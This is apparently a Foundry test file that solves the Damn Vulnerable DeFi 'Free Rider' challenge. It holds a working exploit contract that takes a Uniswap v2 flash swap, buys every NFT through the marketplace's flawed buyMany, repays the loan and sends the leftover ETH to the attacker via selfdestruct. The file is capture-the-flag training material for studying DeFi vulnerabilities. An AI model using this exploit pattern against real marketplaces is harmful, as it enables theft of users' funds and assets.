// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import "forge-std/Test.sol";

import {FreeRiderBuyer} from "../../../src/Contracts/free-rider/FreeRiderBuyer.sol";
import {FreeRiderNFTMarketplace} from "../../../src/Contracts/free-rider/FreeRiderNFTMarketplace.sol";
import {IUniswapV2Router02, IUniswapV2Factory, IUniswapV2Pair} from "../../../src/Contracts/free-rider/Interfaces.sol";
import {DamnValuableNFT} from "../../../src/Contracts/DamnValuableNFT.sol";
import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
import {WETH9} from "../../../src/Contracts/WETH9.sol";
import {IERC721Receiver} from "openzeppelin-contracts/token/ERC721/IERC721Receiver.sol";
import {IERC721} from "openzeppelin-contracts/token/ERC721/IERC721.sol";

contract FreeRider is Test {
    // The NFT marketplace will have 6 tokens, at 15 ETH each
    uint256 internal constant NFT_PRICE = 15 ether;
    uint8 internal constant AMOUNT_OF_NFTS = 6;
    uint256 internal constant MARKETPLACE_INITIAL_ETH_BALANCE = 90 ether;

    // The buyer will offer 45 ETH as payout for the job
    uint256 internal constant BUYER_PAYOUT = 45 ether;

    // Initial reserves for the Uniswap v2 pool
    uint256 internal constant UNISWAP_INITIAL_TOKEN_RESERVE = 15_000e18;
    uint256 internal constant UNISWAP_INITIAL_WETH_RESERVE = 9000 ether;
    uint256 internal constant DEADLINE = 10_000_000;

    FreeRiderBuyer internal freeRiderBuyer;
    FreeRiderNFTMarketplace internal freeRiderNFTMarketplace;
    DamnValuableToken internal dvt;
    DamnValuableNFT internal damnValuableNFT;
    IUniswapV2Pair internal uniswapV2Pair;
    IUniswapV2Factory internal uniswapV2Factory;
    IUniswapV2Router02 internal uniswapV2Router;
    WETH9 internal weth;
    address payable internal buyer;
    address payable internal attacker;
    address payable internal deployer;

    function setUp() public {
        /**
         * SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE
         */
        buyer = payable(address(uint160(uint256(keccak256(abi.encodePacked("buyer"))))));
        vm.label(buyer, "buyer");
        vm.deal(buyer, BUYER_PAYOUT);

        deployer = payable(address(uint160(uint256(keccak256(abi.encodePacked("deployer"))))));
        vm.label(deployer, "deployer");
        vm.deal(deployer, UNISWAP_INITIAL_WETH_RESERVE + MARKETPLACE_INITIAL_ETH_BALANCE);

        // Attacker starts with little ETH balance
        attacker = payable(address(uint160(uint256(keccak256(abi.encodePacked("attacker"))))));
        vm.label(attacker, "Attacker");
        vm.deal(attacker, 0.5 ether);

        // Deploy WETH contract
        weth = new WETH9();
        vm.label(address(weth), "WETH");

        // Deploy token to be traded against WETH in Uniswap v2
        vm.startPrank(deployer);
        dvt = new DamnValuableToken();
        vm.label(address(dvt), "DVT");

        // Deploy Uniswap Factory and Router
        uniswapV2Factory =
            IUniswapV2Factory(deployCode("./src/build-uniswap/v2/UniswapV2Factory.json", abi.encode(address(0))));

        uniswapV2Router = IUniswapV2Router02(
            deployCode(
                "./src/build-uniswap/v2/UniswapV2Router02.json", abi.encode(address(uniswapV2Factory), address(weth))
            )
        );

        // Approve tokens, and then create Uniswap v2 pair against WETH and add liquidity
        // Note that the function takes care of deploying the pair automatically
        dvt.approve(address(uniswapV2Router), UNISWAP_INITIAL_TOKEN_RESERVE);
        uniswapV2Router.addLiquidityETH{value: UNISWAP_INITIAL_WETH_RESERVE}(
            address(dvt), // token to be traded against WETH
            UNISWAP_INITIAL_TOKEN_RESERVE, // amountTokenDesired
            0, // amountTokenMin
            0, // amountETHMin
            deployer, // to
            DEADLINE // deadline
        );

        // Get a reference to the created Uniswap pair
        uniswapV2Pair = IUniswapV2Pair(uniswapV2Factory.getPair(address(dvt), address(weth)));

        assertEq(uniswapV2Pair.token0(), address(dvt));
        assertEq(uniswapV2Pair.token1(), address(weth));
        assertGt(uniswapV2Pair.balanceOf(deployer), 0);

        freeRiderNFTMarketplace = new FreeRiderNFTMarketplace{
            value: MARKETPLACE_INITIAL_ETH_BALANCE
        }(AMOUNT_OF_NFTS);

        damnValuableNFT = DamnValuableNFT(freeRiderNFTMarketplace.token());

        for (uint8 id = 0; id < AMOUNT_OF_NFTS; id++) {
            assertEq(damnValuableNFT.ownerOf(id), deployer);
        }

        damnValuableNFT.setApprovalForAll(address(freeRiderNFTMarketplace), true);

        uint256[] memory NFTsForSell = new uint256[](6);
        uint256[] memory NFTsPrices = new uint256[](6);
        for (uint8 i = 0; i < AMOUNT_OF_NFTS;) {
            NFTsForSell[i] = i;
            NFTsPrices[i] = NFT_PRICE;
            unchecked {
                ++i;
            }
        }

        freeRiderNFTMarketplace.offerMany(NFTsForSell, NFTsPrices);

        assertEq(freeRiderNFTMarketplace.amountOfOffers(), AMOUNT_OF_NFTS);
        vm.stopPrank();

        vm.startPrank(buyer);

        freeRiderBuyer = new FreeRiderBuyer{value: BUYER_PAYOUT}(
            attacker,
            address(damnValuableNFT)
        );

        vm.stopPrank();

        console.log(unicode"🧨 Let's see if you can break it... 🧨");
    }

    function testExploit() public {
        /**
         * EXPLOIT START *
         */
        vm.startPrank(attacker, attacker);
        UniswapV2FlashSwapNFTTrader trader = new UniswapV2FlashSwapNFTTrader(uniswapV2Pair, freeRiderNFTMarketplace,
         freeRiderBuyer,
         weth);
        vm.label(address(trader), "UniswapV2 FlashSwap NFTTrader");
        trader.flashSwap(NFT_PRICE);
        vm.stopPrank();
        /**
         * EXPLOIT END *
         */
        validation();
        console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
    }

    function validation() internal {
        /**
         * SUCCESS CONDITIONS
         */

        // Attacker must have earned all ETH from the payout
        assertGt(attacker.balance, BUYER_PAYOUT);
        assertEq(address(freeRiderBuyer).balance, 0);

        // The buyer extracts all NFTs from its associated contract
        vm.startPrank(buyer);
        for (uint256 tokenId = 0; tokenId < AMOUNT_OF_NFTS; tokenId++) {
            damnValuableNFT.transferFrom(address(freeRiderBuyer), buyer, tokenId);
            assertEq(damnValuableNFT.ownerOf(tokenId), buyer);
        }
        vm.stopPrank();

        // Exchange must have lost NFTs and ETH
        assertEq(freeRiderNFTMarketplace.amountOfOffers(), 0);
        assertLt(address(freeRiderNFTMarketplace).balance, MARKETPLACE_INITIAL_ETH_BALANCE);
    }
}

interface IUniswapV2Callee {
    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external;
}

// https://blog.uniswap.org/uniswap-v2#flash-swaps
contract UniswapV2FlashSwapNFTTrader is IUniswapV2Callee, IERC721Receiver {
    IUniswapV2Pair private immutable uniswapV2Pair;
    FreeRiderNFTMarketplace freeRiderNFTMarketplace;
    FreeRiderBuyer freeRiderBuyer;
    DamnValuableNFT damnValuableNFT;
    WETH9 weth;
    address owner;
    address buyer;

    constructor(
        IUniswapV2Pair _uniswapV2Pair,
        FreeRiderNFTMarketplace _freeRiderNFTMarketplace,
        FreeRiderBuyer _freeRiderBuyer,
        WETH9 _weth
    ) {
        uniswapV2Pair = _uniswapV2Pair;
        freeRiderNFTMarketplace = _freeRiderNFTMarketplace;
        freeRiderBuyer = _freeRiderBuyer;
        weth = _weth;
        owner = msg.sender;
    }

    function flashSwap(uint256 amount) external {
        bytes memory data = abi.encode("milady");
        // function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
        uniswapV2Pair.swap(0, amount, address(this), data);
    }

    // This function is called by the DVT/WETH pair contract
    function uniswapV2Call(address, uint256, uint256 _amount1, bytes calldata) external {
        // save nft ids to buy from markt
        uint256[] memory tokenIds = new uint256[](6);
        for (uint256 tokenId = 0; tokenId < tokenIds.length; tokenId++) {
            tokenIds[tokenId] = tokenId;
        }

        // calculate the fee
        // about 0.3% fee, +1 to round up
        uint256 fee = (_amount1 * 3) / 997 + 1;
        uint256 amountToRepay = _amount1 + fee;

        // turn swapped wETH into ETH
        weth.withdraw(_amount1);

        // buy nfts from the market
        freeRiderNFTMarketplace.buyMany{value: _amount1}(tokenIds);

        // repay the debt for the flashSwap
        weth.deposit{value: amountToRepay}();
        weth.transfer(address(uniswapV2Pair), amountToRepay);

        // transfer nfts to the buyer
        for (uint256 i = 0; i < tokenIds.length; i++) {
            DamnValuableNFT(freeRiderNFTMarketplace.token()).safeTransferFrom(address(this), address(freeRiderBuyer), i);
        }

        // transfer remaining funds to attacker
        selfdestruct(payable(owner));
    }

    // receive erc721
    // Read https://eips.ethereum.org/EIPS/eip-721 for more info on this function
    function onERC721Received(address, address, uint256, bytes memory) external override returns (bytes4) {
        return this.onERC721Received.selector;
    }

    // receive ETH
    receive() external payable {}
}
